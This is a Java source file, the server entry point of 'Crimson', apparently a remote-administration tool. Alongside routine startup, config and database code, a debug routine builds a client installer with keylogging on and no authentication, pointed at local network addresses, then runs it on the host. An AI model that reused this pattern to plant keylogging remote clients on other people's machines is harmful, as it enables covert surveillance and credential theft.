/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.util.Date;
import java.util.NoSuchElementException;
import java.util.Scanner;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.misc.EH;
import com.subterranean_security.crimson.core.misc.FileLocking;
import com.subterranean_security.crimson.core.misc.HCP;
import com.subterranean_security.crimson.core.platform.Platform;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
import com.subterranean_security.crimson.core.proto.Misc.AuthMethod;
import com.subterranean_security.crimson.core.proto.Misc.AuthType;
import com.subterranean_security.crimson.core.proto.Misc.Outcome;
import com.subterranean_security.crimson.core.storage.StorageFacility;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.LogUtil;
import com.subterranean_security.crimson.core.util.Native;
import com.subterranean_security.crimson.core.util.RandomUtil;
import com.subterranean_security.crimson.core.util.TempUtil;
import com.subterranean_security.crimson.server.storage.ServerDatabase;
import com.subterranean_security.crimson.server.store.Authentication;
import com.subterranean_security.crimson.server.store.ListenerStore;
import com.subterranean_security.crimson.universal.Universal;
import com.subterranean_security.crimson.universal.stores.Database;

public final class Server {
	private static final Logger log = LoggerFactory.getLogger(Server.class);

	public static void main(String[] argv) {

		// apply LogBack settings for the session
		LogUtil.configure();
		log.info("Launching Crimson Server (build {})", Common.build);

		// Establish the custom fallback exception handler
		Thread.setDefaultUncaughtExceptionHandler(new EH());

		// Establish the custom shutdown hook
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());

		// Try to get a lock or exit
		if (!FileLocking.lock(Universal.Instance.SERVER)) {
			log.error("A Crimson server is already running in another process");
			System.exit(0);
		}

		// Read configuration
		readConfig();

		// Load native libraries
		Native.Loader.load();

		// Clear /tmp/
		TempUtil.clear();

		// initialize server database
		initializeDatabase();

		try {
			Common.cvid = Database.getFacility().getInteger("cvid");
		} catch (NoSuchElementException | SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		ListenerStore.start();

		if (Universal.isDebug && !ServerState.isCloudMode() && !ServerState.isExampleMode()) {
			installDebugClient();
		}

		parse();
	}

	private static void initializeDatabase() {
		StorageFacility sf = new ServerDatabase(Server.class.getName(),
				new File(Common.Directories.var.getAbsolutePath() + "/system.db"));
		try {
			sf.initialize();
		} catch (ClassNotFoundException e) {
			log.error("Failed to load SQLite dependancy");
			System.exit(0);
		} catch (IOException e) {
			log.error("Failed to write database");
			System.exit(0);
		} catch (SQLException e) {
			log.error("SQL error: {}", e.getMessage());
			System.exit(0);
		}

		Database.setFacility(sf);
	}

	public static void parse() {

		try (Scanner stdin = new Scanner(System.in)) {
			while (true) {
				String input = stdin.nextLine();
				String[] parts = input.split("\\s+");

				if (input.isEmpty()) {
					continue;
				} else if (parts[0].equals("quit") || parts[0].equals("exit") || parts[0].equals("stop")) {
					System.exit(0);
				}

			}
		} catch (NoSuchElementException e) {
			// ignore because server is probably shutting down
			return;
		}

	}

	/**
	 * Generate and install a debug client on the localhost
	 * 
	 * @return Operation outcome
	 */
	private static Outcome installDebugClient() {

		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);

		// Use group authentication
		Outcome authOutcome = Authentication
				.create(AuthMethod.newBuilder().setCreation(new Date().getTime()).setType(AuthType.GROUP).setId(0)
						.setName("TESTGROUP").setGroupSeedPrefix(RandomUtil.randString(5)).build());

		if (!authOutcome.getResult()) {
			return authOutcome;
		}

		ClientConfig cc = ClientConfig.newBuilder().setOutputType("Java (.jar)").setAuthType(AuthType.NO_AUTH)
				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
				.addTarget(NetworkTarget.newBuilder().setServer("192.168.1.76").setPort(10101).build())
				.setPathWin("%USERHOME%/cr_install").setPathBsd("/").setPathLin("%USERHOME%/cr_install")
				.setPathOsx("%USERHOME%/cr_install").setPathSol("/").setReconnectPeriod(3000)
				.setBuildNumber(Common.build).setAutostart(false).setKeylogger(true)
				.setKeyloggerFlushMethod(Trigger.EVENT).setKeyloggerFlushValue(15).build();
		try {
			// Generate installer
			Generator g = new Generator();
			g.generate(cc);

			// Write installer
			byte[] res = g.getResult();
			File installer = new File(System.getProperty("user.home") + "/client.jar");
			FileUtil.writeFile(res, installer);

			// Run installer
			HCP.run(HCP.HCP_BASE, Platform.osFamily.getJavaw() + " -jar \"" + installer.getAbsolutePath() + "\"");

		} catch (Exception e) {
			log.error("Failed to generate debug installer");
			outcome.setResult(false).setComment(e.getMessage());
		}

		return outcome.build();
	}

	// TODO move into a config class
	private static void readConfig() {
		File config = new File(Common.Directories.base.getAbsolutePath() + "/server.conf");
		try {
			if (!config.exists()) {
				config.createNewFile();

				// set default
				setDefaults(config);
			}
			Scanner sc = new Scanner(config);
			while (sc.hasNextLine()) {
				set(sc.nextLine());
			}
			sc.close();
		} catch (IOException e) {
			log.warn("Configuration error!");

		}

	}

	private static void setDefaults(File config) {
		try {
			PrintWriter pw = new PrintWriter(config);
			pw.println(Directives.EXAMPLE_MODE + "=false");
			pw.println(Directives.CLOUD_MODE + "=false");
			pw.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private static void set(String s) {
		String[] p = s.split("=");

		switch (Directives.fromString(p[0])) {
		case EXAMPLE_MODE: {
			ServerState.setExampleMode(Boolean.parseBoolean(p[1]));
			return;
		}
		case CLOUD_MODE: {
			ServerState.setCloudMode(Boolean.parseBoolean(p[1]));
			return;
		}
		}
	}

	public enum Directives {
		EXAMPLE_MODE("example-mode"), CLOUD_MODE("cloud-mode");

		private String text;

		Directives(String text) {
			this.text = text;
		}

		public String toString() {
			return this.text;
		}

		public static Directives fromString(String text) {
			if (text != null) {
				for (Directives b : Directives.values()) {
					if (text.equalsIgnoreCase(b.text)) {
						return b;
					}
				}
			}
			return null;
		}
	}

}
